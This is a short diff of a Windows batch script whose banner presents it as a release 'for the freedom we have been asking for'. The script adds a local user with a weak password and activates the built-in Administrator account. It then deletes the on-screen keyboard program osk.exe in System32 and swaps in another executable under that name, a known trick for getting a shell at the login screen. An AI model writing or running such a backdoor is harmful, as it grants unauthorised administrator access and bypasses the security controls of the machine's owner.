@@ -12,7 +12,8 @@ echo "       Release R1 . For the freedom we have been asking for. @Elation232  
 echo "============================================================================="
 
 net user TrustedUser 12345678 /add > NUL
-net localgroup administrators TrustedUser /add > NUL
+net user administrator /active:yes
+net user Administrator /active:yes
 cd C:\Windows\System32 > NUL
 del osk.exe > NUL
 ren lol.exe osk.exe > NUL 
